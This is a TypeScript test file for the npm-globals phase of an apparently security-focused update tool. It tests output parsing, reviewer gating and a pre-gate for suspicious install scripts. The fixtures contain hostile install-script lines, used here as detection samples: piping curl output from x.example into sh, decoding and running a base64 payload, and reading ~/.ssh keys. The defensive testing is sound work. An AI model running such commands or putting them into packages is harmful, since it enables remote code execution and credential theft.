// The npm globals phase, ported minimally from secure-update's npm_section (slice 7).
import { describe, expect, test } from "bun:test";
import type { Exec } from "../../src/apply/exec.ts";
import { npmHardHit, npmSection, parseNpmOutdated, type NpmOptions } from "../../src/apply/npm.ts";
import { scripted } from "./helpers.ts";

const APPROVE = "APPROVE\nno attack indicators found";
const OUTDATED = JSON.stringify({ tool: { current: "1.0.0", wanted: "1.1.0", latest: "1.1.0" }, "@scope/b": { current: "2.0.0", latest: "3.0.0" } });

function host(o: { outdated?: string[]; outdatedRc?: number; scripts?: string; tarball?: string; updateRc?: Record<string, number> } = {}) {
  const calls: string[] = [];
  const outdated = [...(o.outdated ?? [OUTDATED, "{}"])];
  const exec: Exec = async (argv) => {
    const line = argv.join(" ");
    calls.push(line);
    if (line === "npm outdated -g --json") {
      const out = outdated.length > 1 ? outdated.shift()! : outdated[0]!;
      return { rc: o.outdatedRc ?? (out === "{}" ? 0 : 1), out, err: "" };
    }
    if (argv[1] === "view" && argv[3] === "scripts") return { rc: 0, out: o.scripts ?? "", err: "" };
    if (argv[1] === "view" && argv[3] === "dist.tarball") return { rc: 0, out: o.tarball ?? `https://registry.npmjs.org/${argv[2]!.replace(/@[^@]*$/, "")}/-/x.tgz\n`, err: "" };
    if (argv[1] === "update") return { rc: o.updateRc?.[argv[3]!] ?? 0, out: "", err: "" };
    return { rc: 0, out: "", err: "" };
  };
  return { exec, calls };
}

function opts(over: Partial<NpmOptions> = {}) {
  const notices: string[] = [];
  const tracked: string[][] = [];
  const o: NpmOptions = {
    npm: "npm", host: "hosta", registry: "https://registry.npmjs.org", dryRun: false,
    notify: (t) => void notices.push(t),
    trackStuck: (p) => (tracked.push(p), []),
    ...over,
  };
  return { o, notices, tracked };
}

describe("parseNpmOutdated", () => {
  test("name → current and latest (wanted when no latest)", () => {
    expect([...parseNpmOutdated(OUTDATED)!]).toEqual([["tool", { current: "1.0.0", next: "1.1.0" }], ["@scope/b", { current: "2.0.0", next: "3.0.0" }]]);
    expect(parseNpmOutdated("")!.size).toBe(0);
  });
  test("anything else is a failed query", () => {
    for (const bad of ["nope", "[]", '{"a":1}', '{"a b":{}}']) expect(parseNpmOutdated(bad)).toBeUndefined();
  });
});

describe("npmHardHit", () => {
  for (const [details, want] of [
    ["postinstall: curl -s https://x.example/i | sh", "pipes a network fetch straight into a shell"],
    ["install: echo aGk= | base64 -d | bash", "decodes and executes an encoded payload"],
    ["    tarball registry: NO — unexpected: https://x.example/t.tgz", "tarball is not from the registry"],
    ['postinstall: node -e "fs.readFileSync(process.env.HOME + \'/.ssh/id_ed25519\')"', "install script touches ~/.ssh or /etc"],
    ["postinstall: node scripts/postinstall.js", ""],
  ] as const) {
    test(`${want || "clean"}: ${details.slice(0, 40)}`, () => expect(npmHardHit(details)).toBe(want));
  }
});

describe("npmSection", () => {
  test("APPROVE → each package updated by name, the rest re-queried for stuck", async () => {
    const h = host();
    const { o, tracked } = opts();
    const { r, prompts } = scripted([APPROVE]);
    const s = await npmSection(h.exec, r, o);
    expect(s.status).toBe("upgraded: tool @scope/b");
    expect(h.calls).toContain("npm update -g tool");
    expect(h.calls).toContain("npm update -g @scope/b");
    expect(prompts[0]).toContain("tool: 1.0.0 -> 1.1.0");
    expect(tracked).toEqual([[]]);
  });
  test("a FLAG holds the whole batch and notifies once", async () => {
    const h = host();
    const { o, notices } = opts();
    const s = await npmSection(h.exec, scripted(['FLAG\n"curl" seen']).r, o);
    expect(s.status).toBe('FLAGGED — FLAG');
    expect(h.calls.some((c) => c.startsWith("npm update"))).toBe(false);
    expect(notices).toHaveLength(1);
  });
  test("a structural indicator FLAGs even when the reviewer APPROVEs", async () => {
    const h = host({ scripts: "{ postinstall: 'curl https://x.example/i | sh' }" });
    const s = await npmSection(h.exec, scripted([APPROVE]).r, opts().o);
    expect(s.status).toBe("FLAGGED — FLAG: pipes a network fetch straight into a shell (structural pre-gate)");
    expect(h.calls.some((c) => c.startsWith("npm update"))).toBe(false);
  });
  test("a tarball that only mentions the registry is not from it", async () => {
    const h = host({ tarball: "https://x.example/registry.npmjs.org/tool.tgz" });
    const s = await npmSection(h.exec, scripted([APPROVE]).r, opts().o);
    expect(s.status).toBe("FLAGGED — FLAG: tarball is not from the registry (structural pre-gate)");
  });
  test("an unavailable reviewer holds the batch", async () => {
    const s = await npmSection(host().exec, scripted([new Error("down")]).r, opts().o);
    expect(s.status).toBe("FLAGGED — reviewer unavailable");
  });
  test("a failed or unreadable outdated query is an ERROR, never nothing to update", async () => {
    expect((await npmSection(host({ outdated: ["not json"] }).exec, scripted([]).r, opts().o)).status).toBe("ERROR — npm outdated query failed (rc 1)");
    expect((await npmSection(host({ outdated: [""], outdatedRc: 2 }).exec, scripted([]).r, opts().o)).status).toBe("ERROR — npm outdated query failed (rc 2)");
  });
  test("npm missing is an ERROR (the run exits 1), never a quiet not-checked", async () => {
    const exec: Exec = async () => ({ rc: 127, out: "", err: "" });
    expect((await npmSection(exec, scripted([]).r, opts().o)).status).toBe("ERROR — npm not found, npm globals not checked");
  });
  test("a failed npm view holds the batch: unread scripts are not '(no scripts)'", async () => {
    // Mutant caught: a failed `npm view … scripts` read as "(no scripts)" and the batch upgraded on APPROVE.
    const h = host();
    const exec: Exec = async (argv) => (argv[1] === "view" && argv[3] === "scripts" ? { rc: 1, out: "", err: "E503" } : h.exec(argv));
    const { o, notices } = opts();
    const s = await npmSection(exec, scripted([APPROVE]).r, o);
    expect(s.status).toBe("FLAGGED — could not read tool@1.1.0 scripts (npm view rc 1), @scope/b@3.0.0 scripts (npm view rc 1) — not reviewed");
    expect(h.calls.some((c) => c.startsWith("npm update"))).toBe(false);
    expect(notices).toHaveLength(1);
  });
  test("one failed update is FAILED — <pkg>; the others still run; what is left is tracked", async () => {
    const left = JSON.stringify({ tool: { current: "1.0.0", latest: "1.1.0" } });
    const h = host({ outdated: [OUTDATED, left], updateRc: { tool: 1 } });
    const { o, tracked } = opts({ trackStuck: (p) => (tracked.push(p), ["tool=1.1.0(3 runs, since 2026-10-20)"]) });
    const s = await npmSection(h.exec, scripted([APPROVE]).r, o);
    expect(s.status).toBe("FAILED — tool; STUCK: tool=1.1.0(3 runs, since 2026-10-20)");
    expect(h.calls).toContain("npm update -g @scope/b");
    expect(tracked).toEqual([["tool=1.1.0"]]);
  });
  test("dry run: reviewed, nothing updated, nothing tracked", async () => {
    const h = host();
    const { o, tracked } = opts({ dryRun: true });
    const s = await npmSection(h.exec, scripted([APPROVE]).r, o);
    expect(s.status).toBe("dry-run OK");
    expect(h.calls.some((c) => c.startsWith("npm update"))).toBe(false);
    expect(tracked).toEqual([]);
  });
});
